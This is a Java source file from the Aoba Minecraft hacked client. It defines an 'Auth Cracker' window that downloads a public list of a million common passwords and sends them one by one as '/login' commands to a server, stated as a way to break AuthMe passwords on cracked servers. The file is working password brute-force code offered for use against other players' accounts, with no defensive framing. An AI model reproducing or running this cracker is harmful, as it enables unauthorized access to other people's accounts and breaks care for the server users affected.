/*
 * Aoba Hacked Client
 * Copyright (C) 2019-2024 coltonk9043
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package net.aoba.gui.navigation.windows;

import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URL;
import java.util.Scanner;
import java.util.concurrent.TimeUnit;

import com.mojang.logging.LogUtils;

import net.aoba.gui.components.ButtonComponent;
import net.aoba.gui.components.SeparatorComponent;
import net.aoba.gui.components.SliderComponent;
import net.aoba.gui.components.StackPanelComponent;
import net.aoba.gui.components.StringComponent;
import net.aoba.gui.navigation.Window;
import net.aoba.settings.types.FloatSetting;
import net.minecraft.client.MinecraftClient;

public class AuthCrackerWindow extends Window {
	private ButtonComponent start;
	private StringComponent startButtonText;

	private FloatSetting delay = FloatSetting.builder().id("authcracker_delay").displayName("Delay").defaultValue(100f)
			.minValue(50f).maxValue(50000f).build();

	private AuthCracker authCracker;

	Runnable startRunnable;
	Runnable endRunnable;

	public AuthCrackerWindow() {
		super("Auth Cracker", 185, 150);

		this.minWidth = 350f;
		StackPanelComponent stackPanel = new StackPanelComponent();

		stackPanel.addChild(new StringComponent("AuthCracker"));
		stackPanel.addChild(new SeparatorComponent());

		StringComponent label = new StringComponent(
				"This panel can be used to break Auth passwords used in cracked servers.");
		stackPanel.addChild(label);

		SliderComponent slider = new SliderComponent(delay);
		stackPanel.addChild(slider);

		authCracker = new AuthCracker(delay);

		this.startRunnable = new Runnable() {
			@Override
			public void run() {
				authCracker.Start();
				startButtonText.setText("Cancel");
				start.setOnClick(endRunnable);
			}
		};

		this.endRunnable = new Runnable() {
			@Override
			public void run() {
				authCracker.Stop();
				startButtonText.setText("Start");
				start.setOnClick(startRunnable);
			}
		};

		start = new ButtonComponent(startRunnable);

		// Create Text inside button
		startButtonText = new StringComponent("Start");
		start.addChild(startButtonText);
		stackPanel.addChild(start);

		addChild(stackPanel);
	}
}

class AuthCracker {

	private Thread curThread;
	private boolean shouldContinue = true;
	private MinecraftClient mc = MinecraftClient.getInstance();
	private FloatSetting delay;

	public AuthCracker(FloatSetting delay) {
		this.delay = delay;
	}

	private long time = System.currentTimeMillis();

	private void RunAuthCracker() {
		LogUtils.getLogger().info("Aoba AuthMe Cracker Started.");
		URL url;
		Scanner s = null;
		try {
			URI uri = new URI(
					"https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt");
			url = uri.toURL();
			s = new Scanner(url.openStream());
		} catch (IOException e) {
			e.printStackTrace();
		} catch (URISyntaxException e) {
			e.printStackTrace();
		}
		if (s != null) {
			while (shouldContinue && s.hasNextLine()) {
				if (System.currentTimeMillis() - time > delay.getValue().floatValue()) {
					String str = s.nextLine();
					while (mc.player == null) {
						try {
							TimeUnit.SECONDS.sleep(1);
						} catch (InterruptedException e) {
							e.printStackTrace();
						}
					}
					if (mc.player.networkHandler != null) {
						mc.player.networkHandler.sendChatCommand("login " + str);
						time = System.currentTimeMillis();
					} else {
						LogUtils.getLogger().error("Network Handler is null");
					}
				}
			}
		}

		LogUtils.getLogger().info("Aoba AuthMe Cracker Stopped.");
	}

	public void Start() {
		curThread = new Thread(new Runnable() {
			@Override
			public void run() {
				RunAuthCracker();
			}
		});
		curThread.start();
	}

	public void Stop() {
		this.shouldContinue = false;
	}
}